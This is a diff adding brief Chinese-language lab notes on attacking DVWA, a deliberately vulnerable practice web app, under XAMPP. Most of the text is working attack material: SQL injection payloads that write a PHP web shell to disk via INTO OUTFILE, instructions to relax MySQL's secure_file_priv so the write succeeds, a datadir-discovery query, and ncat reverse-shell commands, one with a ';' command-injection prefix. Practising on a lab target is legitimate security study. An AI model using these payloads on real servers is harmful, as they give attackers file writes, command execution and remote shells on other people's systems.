@@ -1,0 +1,24 @@
+' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/dvwa/cmd.php' #
+安装xmapp
+dvwa源码复制到xmapp安装目录的htdocs里面
+
+secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。
+secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。
+secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。
+
+在my.ini添加如下语句
+secure_file_priv=''
+
+1'union select 1,@@datadir#
+
+' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile 'low.php'#
+' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile 'C:/xampp/htdocs/vulnerabilities/sqli/cmd.php'#
+
+C:\ProgramData\MySQL\MySQL Server 8.0\Data\
+
+cmd.php?cmd=ncat 127.0.0.1 8081 -e /bin/sh
+
+;ncat -e /bin/bash 192.168.50.213 8081
+ncat 192.168.50.213 8081 -e /bin/sh
+
+ncat -e 192.168.50.213 8081
